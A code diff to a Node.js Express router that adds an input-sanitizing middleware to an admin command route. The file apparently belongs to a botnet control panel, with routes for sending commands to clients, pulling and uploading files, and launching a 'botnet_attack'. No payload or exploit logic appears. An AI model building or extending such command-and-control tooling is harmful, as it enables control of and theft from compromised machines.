@@ -4,7 +4,7 @@ import  { send_cmd, upload_file, getFiles, downloadFiles, botnet_attack, getOper
 import multer from "multer";
 import { validate_jwt } from "../middlewares/validate_jwt.mjs";
 import { checkAdmin } from "../middlewares/checkAdmin.mjs";
-
+import sanitize from '../middlewares/sanitize.mjs'
 
 const storage = multer.memoryStorage();
 const upload = multer({ storage: storage });
@@ -26,8 +26,8 @@ const cmd_router = (clients, attacks_running) => {
     router.post('/get_files/', (req,res) => getFiles(clients,req,res));
     router.post('/download/', (req,res) => downloadFiles(clients,req,res));
     router.post('/operations/', (req,res) => getOperations(req,res));
-    router.post('/add_command/', (req,res=response, next )=>{ checkAdmin(req,res, next)}, (req,res) => add_command(req,res));
-    router.delete('/delete_command/', (req,res=response, next)=>{ checkAdmin(req,res, next) }, (req,res) => delete_command(req,res));
+    router.post('/add_command/', (req,res=response, next )=>{ checkAdmin(req,res, next)}, sanitize, (req,res) => add_command(req,res));
+    router.delete('/delete_command/', (req,res=response, next)=>{ checkAdmin(req,res, next) },  (req,res) => delete_command(req,res));
 
     return router;
 };
